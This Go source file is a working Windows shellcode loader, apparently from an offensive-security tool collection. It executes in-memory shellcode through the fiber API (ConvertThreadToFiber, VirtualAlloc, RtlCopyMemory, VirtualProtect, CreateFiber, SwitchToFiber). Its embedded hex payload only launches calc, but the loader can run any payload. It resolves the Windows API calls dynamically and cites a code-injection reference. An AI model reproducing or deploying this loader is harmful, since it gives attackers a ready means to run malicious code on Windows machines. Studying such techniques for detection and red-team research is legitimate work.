// +build windows

/*
This program executes shellcode in the current process using the following steps
	1. Convert the main thread into a fiber with the ConvertThreadToFiber function
	2. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
	3. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
	4. Change the memory page permissions to Execute/Read with VirtualProtect
	5. Call CreateFiber on shellcode address
	6. Call SwitchToFiber to start the fiber and execute the shellcode

NOTE: Currently this program will NOT exit even after the shellcode has been executed. You must force terminate this process

This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
Reference: https://ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber
*/

package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)

func main() {
	verbose := flag.Bool("verbose", false, "Enable verbose output")
	debug := flag.Bool("debug", false, "Enable debug output")
	flag.Parse()

	// Pop Calc Shellcode
	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	if *debug {
		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll")
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	if *debug {
		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect and RtlCopyMemory procedures")
	}
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
	CreateFiber := kernel32.NewProc("CreateFiber")
	SwitchToFiber := kernel32.NewProc("SwitchToFiber")

	if *debug {
		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode")
	}

	fiberAddr, _, errConvertFiber := ConvertThreadToFiber.Call()

	if errConvertFiber != nil && errConvertFiber.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ConvertThreadToFiber:\r\n%s", errConvertFiber.Error()))
	}

	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Fiber address: %x", fiberAddr))
	}

	if *debug {
		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode")
	}
	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}

	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(shellcode)))
	}

	if *debug {
		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory")
	}
	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}
	if *verbose {
		fmt.Println("[-]Shellcode copied to memory")
	}

	if *debug {
		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")
	}

	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}
	if *verbose {
		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
	}

	if *debug {
		fmt.Println("[DEBUG]Calling CreateFiber...")
	}

	fiber, _, errCreateFiber := CreateFiber.Call(0, addr, 0)

	if errCreateFiber != nil && errCreateFiber.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateFiber:\r\n%s", errCreateFiber.Error()))
	}

	if *verbose {
		fmt.Println(fmt.Sprintf("Shellcode fiber created: %x", fiber))
	}

	if *debug {
		fmt.Println("[DEBUG]Calling SwitchToFiber function to execute the shellcode")
	}

	_, _, errSwitchToFiber := SwitchToFiber.Call(fiber)

	if errSwitchToFiber != nil && errSwitchToFiber.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling SwitchToFiber:\r\n%s", errSwitchToFiber.Error()))
	}

	if *verbose {
		fmt.Println("[+]Shellcode Executed")
	}

	if *debug {
		fmt.Println("[DEBUG]Calling SwitchToFiber on main thread/fiber")
	}

	_, _, errSwitchToFiber2 := SwitchToFiber.Call(fiberAddr)

	if errSwitchToFiber2 != nil && errSwitchToFiber2.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling SwitchToFiber:\r\n%s", errSwitchToFiber2.Error()))
	}
	fmt.Println("[DEBUG]I AM HERE")
}

// export GOOS=windows GOARCH=amd64;go build -o goCreateFiberNative.exe cmd/CreateFiber/main.go
